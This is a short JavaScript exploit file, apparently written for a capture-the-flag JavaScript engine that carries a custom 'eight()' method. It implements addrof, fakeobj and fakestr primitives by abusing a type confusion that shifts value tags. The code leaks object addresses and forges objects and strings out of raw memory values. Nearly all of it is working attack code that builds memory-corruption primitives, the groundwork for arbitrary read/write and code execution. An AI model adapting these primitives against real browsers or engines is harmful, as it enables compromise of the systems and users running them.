let bits = new ArrayBuffer(1000);
let floatview = new Float64Array(bits);
let bitview = new Uint32Array(bits);

let addrof = function(obj){
    let first = {"int" : 420, "object" : obj};
    first.eight();
    let second = {"val" : first.int, "floattag" : 7};
    second.eight();
    floatview[0] = second.val;
    first.eight();
    second.eight();
    let firsthalf = bitview[1] * (1 << 32);
    return firsthalf + bitview[0];
};
let fakeobj = function(addr){
    const temp = Math.pow(2, 32);
    bitview[1] = Math.floor(addr/temp);
    bitview[0] = addr >>> 0;
    let first = {"int" : 420, "object" : floatview[0]};
    first.eight();
    let second = {"val" : first.int, "objtag" : -1};
    second.eight();
    let result = second.val;
    
    first.eight();
    second.eight();
    return result;
};

let fakestr = function(thing){
    let temp = Math.pow(2, 32);
    bitview[1] = Math.floor(thing/temp);
    bitview[0] = thing >>> 0;
    let first = {"int" : 420, "object" : floatview[0]};
    // shift the first value plane
    first.eight();
    let second = {"val" : first.gg, "floattag" : -7};
    // shift the second value plane
    // suddenly, value of thing is now tagged with a str!
    second.eight();
    let fakedstr = second.val;
    // reshift to not corrupt pointers
    first.eight();
    second.eight();
    return fakedstr;
};
